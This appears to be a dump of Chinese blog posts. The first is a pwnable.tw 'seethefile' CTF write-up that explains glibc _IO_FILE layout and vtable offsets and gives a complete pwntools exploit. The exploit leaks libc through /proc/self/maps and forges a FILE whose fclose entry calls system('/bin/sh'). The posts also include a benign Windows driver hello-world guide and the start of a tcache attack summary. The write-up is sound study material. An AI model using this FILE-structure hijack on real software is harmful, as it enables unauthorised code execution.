<p><a href="http://blog.leanote.com/post/mut3p1g/FSP-pwnable.tw[9]" target="_blank" rel="noopener">http://blog.leanote.com/post/mut3p1g/FSP-pwnable.tw%5B9%5D</a></p>
<p><a href="https://ray-cp.github.io/archivers/IO_FILE_fclose_analysis" target="_blank" rel="noopener">https://ray-cp.github.io/archivers/IO_FILE_fclose_analysis</a></p>
<p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/io_file/introduction-zh/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/io_file/introduction-zh/</a></p>
<a id="more"></a>

<h2 id="0x1-File-结构描述"><a href="#0x1-File-结构描述" class="headerlink" title="0x1 File 结构描述"></a>0x1 File 结构描述</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* The tag name of this struct is _IO_FILE to preserve historic</span></span><br><span class="line"><span class="comment">   C++ mangled names for functions taking FILE* arguments.</span></span><br><span class="line"><span class="comment">   That name should not be used in new code.  */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">int</span> _flags;                <span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_read_ptr;        <span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_read_end;        <span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_read_base;        <span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_write_base;        <span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_write_ptr;        <span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_write_end;        <span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_buf_base;        <span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_buf_end;        <span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line">  <span class="keyword">int</span> _fileno;</span><br><span class="line">  <span class="keyword">int</span> _flags2;</span><br><span class="line">  <span class="keyword">__off_t</span> _old_offset; <span class="comment">/* This used to be _offset but it's too small.  */</span></span><br><span class="line">  <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span></span><br><span class="line">  <span class="keyword">unsigned</span> short _cur_column;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">char</span> _vtable_offset;</span><br><span class="line">  <span class="keyword">char</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line">  _IO_lock_t *_lock;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>进程中的 FILE 结构会通过_chain 域彼此连接形成一个链表，链表头部用全局变量_IO_list_all 表示，通过这个值我们可以遍历所有的 FILE 结构。</p>
<p>在标准 I/O 库中，每个程序启动时有三个文件流是自动打开的：stdin、stdout、stderr。因此在初始状态下，_IO_list_all 指向了一个有这些文件流构成的链表，但是需要注意的是<strong>这三个文件流位于 libc.so 的数据段。</strong>而我们使用<code>fopen</code>创建的文件流是分配在<strong>堆内存</strong>上的。</p>
<p>但是事实上_IO_FILE 结构外包裹着另一种结构_IO_FILE_plus，其中包含了一个重要的指针 vtable 指向了一系列函数指针。</p>
<p>在 libc2.23 版本下，32 位的 vtable 偏移为 0x94，64 位偏移为 0xd8</p>
<h3 id="IO-FILE-plus"><a href="#IO-FILE-plus" class="headerlink" title="IO_FILE_plus"></a>IO_FILE_plus</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    _IO_FILE    file;</span><br><span class="line">    IO_jump_t   *vtable;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="vtable"><a href="#vtable" class="headerlink" title="vtable"></a>vtable</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> _<span class="title">IO_file_jumps</span> <span class="title">libio_vtable</span> =</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  JUMP_INIT(finish, _IO_file_finish),</span><br><span class="line">  JUMP_INIT(overflow, _IO_file_overflow),</span><br><span class="line">  JUMP_INIT(underflow, _IO_file_underflow),</span><br><span class="line">  JUMP_INIT(uflow, _IO_default_uflow),</span><br><span class="line">  JUMP_INIT(pbackfail, _IO_default_pbackfail),</span><br><span class="line">  JUMP_INIT(xsputn, _IO_file_xsputn),</span><br><span class="line">  JUMP_INIT(xsgetn, _IO_file_xsgetn),</span><br><span class="line">  JUMP_INIT(seekoff, _IO_new_file_seekoff),</span><br><span class="line">  JUMP_INIT(seekpos, _IO_default_seekpos),</span><br><span class="line">  JUMP_INIT(setbuf, _IO_new_file_setbuf),</span><br><span class="line">  JUMP_INIT(sync, _IO_new_file_sync),</span><br><span class="line">  JUMP_INIT(doallocate, _IO_file_doallocate),</span><br><span class="line">  JUMP_INIT(read, _IO_file_read),</span><br><span class="line">  JUMP_INIT(write, _IO_new_file_write),</span><br><span class="line">  JUMP_INIT(seek, _IO_file_seek),</span><br><span class="line">  JUMP_INIT(close, _IO_file_close),</span><br><span class="line">  JUMP_INIT(stat, _IO_file_stat),</span><br><span class="line">  JUMP_INIT(showmanyc, _IO_default_showmanyc),</span><br><span class="line">  JUMP_INIT(imbue, _IO_default_imbue)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="偏移"><a href="#偏移" class="headerlink" title="偏移"></a>偏移</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//struct _IO_FILE</span></span><br><span class="line"><span class="number">0x0</span>   _flags</span><br><span class="line"><span class="number">0x8</span>   _IO_read_ptr</span><br><span class="line"><span class="number">0x10</span>  _IO_read_end</span><br><span class="line"><span class="number">0x18</span>  _IO_read_base</span><br><span class="line"><span class="number">0x20</span>  _IO_write_base</span><br><span class="line"><span class="number">0x28</span>  _IO_write_ptr</span><br><span class="line"><span class="number">0x30</span>  _IO_write_end</span><br><span class="line"><span class="number">0x38</span>  _IO_buf_base</span><br><span class="line"><span class="number">0x40</span>  _IO_buf_end</span><br><span class="line"><span class="number">0x48</span>  _IO_save_base</span><br><span class="line"><span class="number">0x50</span>  _IO_backup_base</span><br><span class="line"><span class="number">0x58</span>  _IO_save_end</span><br><span class="line"><span class="number">0x60</span>  _markers</span><br><span class="line"><span class="number">0x68</span>  _chain</span><br><span class="line"><span class="number">0x70</span>  _fileno</span><br><span class="line"><span class="number">0x74</span>  _flags2</span><br><span class="line"><span class="number">0x78</span>  _old_offset</span><br><span class="line"><span class="number">0x80</span>  _cur_column</span><br><span class="line"><span class="number">0x82</span>  _vtable_offset</span><br><span class="line"><span class="number">0x83</span>  _shortbuf</span><br><span class="line"><span class="number">0x88</span>  _lock</span><br><span class="line"><span class="number">0x90</span>  _offset</span><br><span class="line"><span class="number">0x98</span>  _codecvt</span><br><span class="line"><span class="number">0xa0</span>  _wide_data</span><br><span class="line"><span class="number">0xa8</span>  _freeres_list</span><br><span class="line"><span class="number">0xb0</span>  _freeres_buf</span><br><span class="line"><span class="number">0xb8</span>  __pad5</span><br><span class="line"><span class="number">0xc0</span>  _mode</span><br><span class="line"><span class="number">0xc4</span>  _unused2</span><br><span class="line"><span class="number">0xd8</span>  vtable</span><br></pre></td></tr></table></figure>

<h2 id="0x2-seethefile"><a href="#0x2-seethefile" class="headerlink" title="0x2 seethefile"></a>0x2 seethefile</h2><h3 id="分析程序"><a href="#分析程序" class="headerlink" title="分析程序"></a>分析程序</h3><ul>
<li><code>openfile:</code>读取 长度为63 filename,打开文件,这里有溢出，因为 filename 大小为 40,但是不能覆盖到fp</li>
<li><code>writefile:</code>输出文件 magicbuf，通过这个应该能泄露地址，首先要把内容写道magicbuf</li>
<li><code>readfile:</code>从文件中读取内容到 0x18 长度</li>
<li><code>closefile:</code> 这里会调用 fclose 函数，可以用来触发</li>
<li><code>xexit :</code> 这里 name 有溢出。可以覆盖到fp,使之指向我们伪造的fp,在调用fcolse时调用system(“bin/sh”)</li>
</ul>
<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><h4 id="泄露libc"><a href="#泄露libc" class="headerlink" title="泄露libc"></a>泄露libc</h4><p>在linux系统中，文件/proc/[pid]/maps中记录了pid对应程序的内存区域以及权限信息等，程序自身可以通过访问/proc/self/maps文件获取这些信息，因此我们可以利用本题文件读取的功能，获取maps文件中记录的地址信息，从而获得libc的地址。</p>
<h4 id="构造file"><a href="#构造file" class="headerlink" title="构造file"></a>构造file</h4><p>想要拿到shell，以下是关键:</p>
<ul>
<li><code>fp</code>指向伪造的<code>IO_file</code>存在</li>
<li><code>IO_file</code>的<code>vtable-&gt;_fclose</code> 覆盖为<code>system</code>地址</li>
<li>因为<code>vtable</code>中的函数调用时会把对应的<code>_IO_FILE_plus</code>指针作为第一个参数传递，因此这里我们把<code>&quot;sh&quot;</code>写入<code>_IO_FILE_plus</code>头部。</li>
</ul>
<p>但是构造的时候需要注意：</p>
<ol>
<li>偏移<code>0x48</code>处的<code>lock</code>字段指向的是一个<code>IO_stdfile_2_lock</code>结构，本地调试时这个结构中的数据均为<code>\x00</code>；因此，我们可以用\x00填充name，然后用name的地址覆盖<code>lock</code>字段。</li>
<li>同时要注意<code>_vtable_offset</code>要为0，其偏移为<code>0x46</code>且只占一个字节</li>
</ol>
<p>从看到一位师傅的思路不错，它一开始总是报错，于是就找了一个合法的<code>FILE</code>结构，将里面不为空的全部复制为<code>name</code>对应的地址，其他的都为0，将这个结构重新尝试了一遍就能在本地成功了。</p>
<h4 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h4><p><code>__flags</code> 记录 <code>FILE</code> 结构体的一些状态；<br><code>_markers</code> 为指向 <code>markers</code> 结构体的指针变量，存放流的位置的单向链表；<br><code>_chain</code> 变量为一个单向链表的指针，记录进程中创建的 FILE 结构体。</p>
<h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"></span><br><span class="line">local = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(<span class="string">'./seethefile'</span>)</span><br><span class="line">    elf = ELF(<span class="string">'./seethefile'</span>)</span><br><span class="line">    libc = ELF(<span class="string">"/lib/i386-linux-gnu/libc.so.6"</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">'chall.pwnable.tw'</span>, <span class="number">10200</span>)</span><br><span class="line">    elf = ELF(<span class="string">'./seethefile'</span>)</span><br><span class="line">    libc = ELF(<span class="string">"./libc.so.6"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">openfile</span><span class="params">(name)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'What do you want to see :'</span>)</span><br><span class="line">    p.sendline(name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">readfile</span><span class="params">()</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">writefile</span><span class="params">()</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">closefile</span><span class="params">()</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">    p.sendline(<span class="string">'4'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exit_with_name</span><span class="params">(name)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">    p.sendline(<span class="string">'5'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Leave your name :'</span>)</span><br><span class="line">    p.sendline(name)</span><br><span class="line"></span><br><span class="line">openfile(<span class="string">'/proc/self/maps'</span>)</span><br><span class="line">readfile()</span><br><span class="line">readfile()</span><br><span class="line">writefile()</span><br><span class="line">data = p.recvuntil(<span class="string">'r-xp'</span>)</span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">  libc_base = int(data.split(<span class="string">'-'</span>)[<span class="number">0</span>].split(<span class="string">'\n'</span>)[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">  libc_base = int(data.split(<span class="string">'-'</span>)[<span class="number">-3</span>].split(<span class="string">'\n'</span>)[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">log.success(<span class="string">'libc_addr: '</span> + hex(libc_base))</span><br><span class="line"></span><br><span class="line">buf = <span class="number">0x0804B260</span></span><br><span class="line">system = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">payload = <span class="string">'/bin/sh'</span>.ljust(<span class="number">0x20</span>, <span class="string">'\x00'</span>)</span><br><span class="line">payload += p32(buf)</span><br><span class="line">payload = payload.ljust(<span class="number">0x48</span>, <span class="string">'\x00'</span>)</span><br><span class="line">payload += p32(buf + <span class="number">0x10</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x94</span>, <span class="string">'\x00'</span>)</span><br><span class="line">payload += p32(<span class="number">0x804b2f8</span> - <span class="number">0x44</span>)</span><br><span class="line">payload += p32(system)</span><br><span class="line">exit_with_name(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
      <tags>
        <tag>IO_file</tag>
      </tags>
  </entry>
  <entry>
    <title>驱动开发初探</title>
    <url>/year/02/02/cl7iordqu006c293fmoyjho9o/</url>
    <content><![CDATA[<h2 id="0x0-前言"><a href="#0x0-前言" class="headerlink" title="0x0 前言"></a>0x0 前言</h2><p>驱动开发的环境配置，以及入门的hello_world<br>参考链接: <a href="https://qwertwwwe.github.io/windows-driver-develop-setup-environment/" target="_blank" rel="noopener">https://qwertwwwe.github.io/windows-driver-develop-setup-environment/</a></p>
<a id="more"></a>
<h2 id="0x1-开发及测试环境"><a href="#0x1-开发及测试环境" class="headerlink" title="0x1 开发及测试环境"></a>0x1 开发及测试环境</h2><p>开发机系统 ： win10, 64位<br>测试机系统： win7, 32位<br>开发软件： visual stdio 2015， （vs2017不支持，反正目前官网上是这么说的）</p>
<h2 id="0x2-安装相应的开发软件"><a href="#0x2-安装相应的开发软件" class="headerlink" title="0x2 安装相应的开发软件"></a>0x2 安装相应的开发软件</h2><p>官方开发软件下载链接：<br><a href="https://developer.microsoft.com/zh-cn/windows/hardware/windows-driver-kit" target="_blank" rel="noopener">https://developer.microsoft.com/zh-cn/windows/hardware/windows-driver-kit</a><br>按照官网的教程：</p>
<ol>
<li>安装vs2015，打开的时候记得安装Visual C++选项。<img src="/02/cl7iordqu006c293fmoyjho9o/1.png" alt></li>
<li>此处可以不选“通用Windows应用开发工具”中的SDK，因为可以从下面的步骤中手动安装。<ol>
<li>安装 Windows SDK, 直接从官网指定的链接下载安装就行；</li>
<li>安装 Windows WDK, 同样直接从官网指定的链接下载安装；</li>
</ol>
</li>
</ol>
<p>记得安装的SDK 和 WDK 的版本号必须完全相同，所以我选择SDK和WDK都从官网给的链接上下载安装，避免vs2015中安装的SDK和自己下载的WDK版本不同。</p>
<p>当然WDK和SDK下下来的时候是个执行文件，打开后可以选择直接安装或者近下载，反正都行，我选择先下载下来，后面自己安装，比较这么大软件下一次太久~~</p>
<p>我记得WDK安装的时候会提示什么将无法开发现代应用程序之类的提示，直接接受并继续~~，其实对其他程序开发有什么影响我也不太清楚，反正我这个环境只开发windows驱动程序而已。</p>
<h2 id="0x3-hello-world程序"><a href="#0x3-hello-world程序" class="headerlink" title="0x3 hello-world程序"></a>0x3 hello-world程序</h2><p>先用vs2015创建一个新项目<br><img src="/02/cl7iordqu006c293fmoyjho9o/2.png" alt><br>然后在Source Files中新建代码文件 DriverEntry.c，</p>
<p><strong>这里注意一定是.c文件。</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ntddk.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//DiverUnload是驱动卸载函数，负责清理资源，在卸载驱动的时候调用</span></span><br><span class="line"><span class="function">VOID <span class="title">DriverUnload</span><span class="params">(PDRIVER_OBJECT	pDriverObject)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//指出这个参数并没有使用而不是我们忘记了，防止编译器报错</span></span><br><span class="line">	UNREFERENCED_PARAMETER(pDriverObject);</span><br><span class="line">	<span class="comment">//表明驱动卸载成功</span></span><br><span class="line">	DbgPrint(<span class="string">"Unload Success"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//驱动的入口函数相当于三环程序的main</span></span><br><span class="line"><span class="comment">//pDvierObject相当于驱动对象指针，pRegPath相当于注册表路径指针</span></span><br><span class="line"><span class="function">NTSTATUS <span class="title">DriverEntry</span><span class="params">(PDRIVER_OBJECT pDriverObject, PUNICODE_STRING pRegPath)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	UNREFERENCED_PARAMETER(pRegPath);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//指定驱动的卸载函数</span></span><br><span class="line">	pDriverObject-&gt;DriverUnload = DriverUnload;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//表明驱动启动成功</span></span><br><span class="line">	DbgPrint(<span class="string">"Hello world"</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//ANSI_STRING 1.缓冲区 2.字符串长度 3.最大长度</span></span><br><span class="line">	<span class="comment">//UNICODE_STRING 1.缓冲区 2.字符串长度 3.最大长度\x00</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//1.字符串常量方式初始化</span></span><br><span class="line">	<span class="comment">//1.1 使用WCHAR类型变量进行初始化</span></span><br><span class="line">	UNICODE_STRING usStr1 = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	WCHAR * szHello = <span class="string">L"Hello WCHAR"</span>;</span><br><span class="line">	RtlInitUnicodeString(&amp;usStr1, szHello);</span><br><span class="line">	KdPrint((<span class="string">"%wS"</span>, usStr1.Buffer));</span><br><span class="line">	<span class="comment">//1.2直接使用字符串初始化</span></span><br><span class="line">	DECLARE_CONST_UNICODE_STRING(usTest, <span class="string">L"Hello Test"</span>);</span><br><span class="line">	KdPrint((<span class="string">"%wS"</span>, usTest.Buffer));</span><br><span class="line"></span><br><span class="line">	<span class="comment">//2.栈空间初始化</span></span><br><span class="line">	<span class="comment">//2.1 定义一个字符串结构体</span></span><br><span class="line">	UNICODE_STRING usTest2 = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	<span class="comment">//2.2 在栈上定义一个WCHAR类型的字符串</span></span><br><span class="line">	WCHAR szHello2[<span class="number">512</span>] = <span class="string">L"Hello 512"</span>;</span><br><span class="line">	<span class="comment">//2.3 把WCHAR类型的字符串指向结构体</span></span><br><span class="line">	usTest2.Buffer = szHello2;</span><br><span class="line">	<span class="comment">//2.4 设置字符串 的实际长度</span></span><br><span class="line">	usTest2.Length = wcslen(<span class="string">L"Hello 512"</span>) * <span class="keyword">sizeof</span>(WCHAR);</span><br><span class="line">	<span class="comment">//2.5 设置最大长度</span></span><br><span class="line">	usTest2.MaximumLength = <span class="keyword">sizeof</span>(szHello2);</span><br><span class="line">	KdPrint((<span class="string">"%wS"</span>, usTest2.Buffer));</span><br><span class="line">	<span class="comment">//返回成功状态</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//3.堆空间初始化</span></span><br><span class="line">	<span class="comment">//3.1 定义一个字符串结构题</span></span><br><span class="line">	UNICODE_STRING usTest3 = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	<span class="comment">//3.2 设置字符串长度</span></span><br><span class="line">	ULONG ulLength = ((wcslen(<span class="string">L"Hello 1024"</span>))) * <span class="keyword">sizeof</span>(WCHAR);</span><br><span class="line">	<span class="comment">//3.3 在分页内存池里申请一块内存</span></span><br><span class="line">	usTest3.Buffer = ExAllocatePoolWithTag(PagedPool, 256 * sizeof(WCHAR), 'POCU');</span><br><span class="line">	<span class="comment">//3.4 内存初始化,跟memset一样</span></span><br><span class="line">	RtlZeroMemory(usTest3.Buffer, <span class="number">256</span> * <span class="keyword">sizeof</span>(WCHAR));</span><br><span class="line">	<span class="comment">//3.5 拷贝字符串、</span></span><br><span class="line">	<span class="built_in">memcpy</span>(usTest3.Buffer, <span class="string">L"Hello 1024"</span>, ulLength);</span><br><span class="line">	<span class="comment">//3.6 设置字符串长度</span></span><br><span class="line">	usTest3.Length = ulLength;</span><br><span class="line">	<span class="comment">//3.7 设置字符串最大长度</span></span><br><span class="line">	usTest3.MaximumLength = <span class="number">256</span> * <span class="keyword">sizeof</span>(WCHAR);</span><br><span class="line">	<span class="comment">//3.8 打印处理，验证一下</span></span><br><span class="line">	KdPrint((<span class="string">"%wS"</span>, usTest3.Buffer));</span><br><span class="line">	<span class="comment">//3.9 释放</span></span><br><span class="line">	ExFreePool(usTest3.Buffer);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//拷贝一个字符串</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//1.定义一个目标字符串</span></span><br><span class="line">	UNICODE_STRING	dst = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	<span class="comment">//2.定义一个WCHAR类型的变量</span></span><br><span class="line">	WCHAR dst_buf[<span class="number">256</span>];</span><br><span class="line">	<span class="comment">//3.初始化目标字符串，然后使用RtlInitEmptyUnicodeString而不是RtlInitUnicodeString</span></span><br><span class="line">	RtlInitEmptyUnicodeString(&amp;dst, &amp;dst_buf, <span class="number">256</span> * <span class="keyword">sizeof</span>(WCHAR));</span><br><span class="line">	<span class="comment">//4.定义源字符串</span></span><br><span class="line">	UNICODE_STRING src = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	<span class="comment">//5.初始化源字符串</span></span><br><span class="line">	RtlInitUnicodeString(&amp;src, <span class="string">L"Hello SRC!"</span>);</span><br><span class="line">	<span class="comment">//6.拷贝</span></span><br><span class="line">	RtlCopyUnicodeString(&amp;dst, &amp;src);</span><br><span class="line">	<span class="comment">//7.打印，是否成功</span></span><br><span class="line">	KdPrint((<span class="string">"%wS"</span>, dst.Buffer));</span><br><span class="line">	<span class="comment">//返回一个成功的状态</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//1. 定义一个字符串</span></span><br><span class="line">	UNICODE_STRING dst2 = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	<span class="comment">//2. 定义一个WCHAR类型的变量，用于预分配</span></span><br><span class="line">	WCHAR dst2_buf[<span class="number">256</span>];</span><br><span class="line">	<span class="comment">//3. 定义源字符串1</span></span><br><span class="line">	UNICODE_STRING src1 = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	<span class="comment">//4. 定义源字符串2</span></span><br><span class="line">	UNICODE_STRING src2 = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	<span class="comment">//5. 把目的字符串初始化为一个空字符串</span></span><br><span class="line">	RtlInitEmptyUnicodeString(&amp;dst2, &amp;dst2_buf, <span class="number">256</span> * <span class="keyword">sizeof</span>(WCHAR));</span><br><span class="line">	<span class="comment">//6. 把两个源字符串初始hua</span></span><br><span class="line">	RtlInitUnicodeString(&amp;src1, <span class="string">L"Hello "</span>);</span><br><span class="line">	RtlInitUnicodeString(&amp;src2, <span class="string">L"woood"</span>);</span><br><span class="line">	<span class="comment">//7. 把源字符串1拷贝到目标字符串中， 使得目标字符串有值</span></span><br><span class="line">	RtlCopyUnicodeString(&amp;dst2, &amp;src1);</span><br><span class="line">	<span class="comment">//8. 进行字符串拼接, 把源字符串</span></span><br><span class="line">	RtlAppendUnicodeStringToString(&amp;dst2, &amp;src2);</span><br><span class="line">	<span class="comment">//9. 显示</span></span><br><span class="line">	KdPrint((<span class="string">"%wS"</span>, dst2.Buffer));</span><br><span class="line">	<span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="0x4-修改项目属性"><a href="#0x4-修改项目属性" class="headerlink" title="0x4 修改项目属性"></a>0x4 修改项目属性</h2><ol>
<li><p>警告等级：<br><img src="/02/cl7iordqu006c293fmoyjho9o/3.jpg" alt><br>将警告等级改为3；将警告视为错误改为否；</p>
</li>
<li><p>修改目标平台属性；<br>这个属性决定你生成的程序在什么平台上运行；<br>此处我的测试机器是win7 32位。<br><img src="/02/cl7iordqu006c293fmoyjho9o/4.png" alt></p>
</li>
</ol>
<h2 id="0x5-在目标机器上运行"><a href="#0x5-在目标机器上运行" class="headerlink" title="0x5 在目标机器上运行"></a>0x5 在目标机器上运行</h2><ol>
<li><p>安装必备的软件<br>将生成的.sys文件拷贝到目标机器；<br>下载一个InstDrv.exe，用来加载驱动程序；<br>下载一个Dbgview.exe，用来显示驱动的log；<br>两个程序都放在测试的机器里。</p>
</li>
<li><p>用admin权限打开InstDrv和Dbgview，进行监听。</p>
</li>
</ol>
]]></content>
      <categories>
        <category>环境配置</category>
      </categories>
      <tags>
        <tag>逆向</tag>
      </tags>
  </entry>
  <entry>
    <title>Tcache Attack 总结</title>
    <url>/year/01/30/cl7iordp4001l293f3q7nh77n/</url>
    <content><![CDATA[<h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>好像这个新版本的tcache安全性更差了，有得必有失</p>
<a id="more"></a>
<h2 id="0x01-概览"><a href="#0x01-概览" class="headerlink" title="0x01 概览"></a>0x01 概览</h2><p>在 tcache 中新增了两个结构体，分别是 tcache_entry 和 tcache_perthread_struct</p>
<p>其实这个next还是相当于<code>chunk</code>里的<code>fd</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* We overlay this structure on the user-data portion of a chunk when the chunk is stored in the per-thread cache.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125; tcache_entry;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* There is one of these for each thread, which contains the per-thread cache (hence "tcache_perthread_struct").  Keeping overall size low is mildly important.  Note that COUNTS and ENTRIES are redundant (we could have just counted the linked list each time), this is for performance reasons.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">char</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; tcache_perthread_struct;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> __thread tcache_perthread_struct *tcache = <span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure>

<p>其中有两个重要的函数， <code>tcache_get()</code> 和 <code>tcache_put()</code>:</p>
